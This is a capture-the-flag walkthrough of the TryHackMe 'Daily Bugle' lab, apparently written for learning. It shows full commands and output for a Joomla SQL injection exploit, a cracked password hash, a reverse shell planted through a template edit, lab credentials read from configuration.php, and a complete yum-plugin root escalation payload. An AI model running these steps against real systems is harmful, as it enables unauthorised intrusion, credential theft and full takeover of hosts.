Spider Man being charged with criminal cases.

Machine Enumeration:

```
┌──(kali㉿kali)-[~/Desktop/THM/Daily Bugle]
└─$ sudo nmap -sS 10.10.48.76 > open_ports.txt            
[sudo] password for kali: 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Daily Bugle]
└─$ cat open_ports.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 14:44 IST
Nmap scan report for 10.10.48.76
Host is up (0.49s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 4.21 seconds
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Daily Bugle]
└─$ sudo nmap -sS -sV -sC -O -Pn -p22,80,3306 10.10.48.76 > ports_scan.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Daily Bugle]
└─$ cat ports_scan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 14:45 IST
Nmap scan report for 10.10.48.76
Host is up (0.46s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (96%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.16 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.68 seconds
```

In the HTTP port 80, we can see the info for robots.txt with 15 disallowed entries.

<img src=https://github.com/user-attachments/assets/feb82850-3850-4fb1-b33e-ff1396b2f881>

Joomla CMS is used by the web server. Also, to test for each entries, I made a custom directory file with the enteries containing those 15 entries and used it with GoBuster.

```
┌──(kali㉿kali)-[~/Desktop/THM/Daily Bugle]
└─$ gobuster dir -u http://10.10.48.76/ -w robots.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.48.76/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                robots.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cache/               (Status: 200) [Size: 31]
/bin/                 (Status: 200) [Size: 31]
/language/            (Status: 200) [Size: 31]
/layouts/             (Status: 200) [Size: 31]
/includes/            (Status: 200) [Size: 31]
/libraries/           (Status: 200) [Size: 31]
/cli/                 (Status: 200) [Size: 31]
/components/          (Status: 200) [Size: 31]
/administrator/       (Status: 200) [Size: 4840]
/modules/             (Status: 200) [Size: 31]
/tmp/                 (Status: 200) [Size: 31]
/plugins/             (Status: 200) [Size: 31]
Progress: 14 / 14 (100.00%)
===============================================================	
Finished
===============================================================
```

All the directories other than the administrator show a blank page when accessed. Only the administrator is functional.

After trying a lot to find the version of Joomla, I came across _joomscan_, something similar to wpscan for WordPress.

<img src=https://github.com/user-attachments/assets/ea58ff62-be5a-46d7-aca5-8585f91fce21>

We get the version using joomscan, which has an SQL Injection vulnerability. Downloaded the Python script and ran it.

```
┌──(kali㉿kali)-[~/Desktop/THM/Daily Bugle]
└─$ python3 CVE-2017-8917 http://10.10.48.76
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Username, email and hashed password. I used hashcat to crack the hash. The `$2` indicates that the hash is a bcrypt hash.

It took a long time to crack the hash. But finally, the credential is- jonah:spiderman123

Then, I logged in to the administrator site. There is a message at the top:

<img src=https://github.com/user-attachments/assets/484e107d-9ea4-4f08-9800-323e09c85e08>

Seeing this, I thought the PHP version 5.4.60 was vulnerable to some exploit. But I couldn't find anything. In the LazyAdmin lab at TryHackMe, the web server uses a CMS named SweetRice, where
we uploaded the reverse PHP code into the Ad code and gained the reverse shell. Also, in one lab, I edited the code of the 404 page and gained the reverse shell.

So, I started surfing the admin panel to find where to change or add the reverse shell code. I found it as:

`Configuration>Templates>Templates>Protostar template`. I tried to upload the reverse shell, but it was showing error. So, I changed the code of the index.php file and reloaded the webpage, with
a NetCat listener opened on my machine.

```
┌──(kali㉿kali)-[~/Desktop/THM]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.48.76] 52666
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 06:42:00 up  1:32,  0 users,  load average: 0.01, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
```

```
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
...
```

The configuration.php file contains a password. I tried this for the 'jjameson' user and succeeded. Where else is this password used? I have no idea. It must also be for 
logging into the MySQL server.

```
sh-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu
whoami
jjameson
```

```
find / -perm -u=s 2>/dev/null    
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

```
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

These two commands are a must, I feel, for privilege escalation: finding binaries with SUID bit, and if the password is known for a user, then checking the allowed commands with SUDO permissions.

GTFOBins is the first site to check after getting a binary which can be run with privilege.

```
[jjameson@dailybugle /]$ TF=$(mktemp -d)               
[jjameson@dailybugle /]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle /]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle /]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle /]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# 
```

And root shell is accessed.
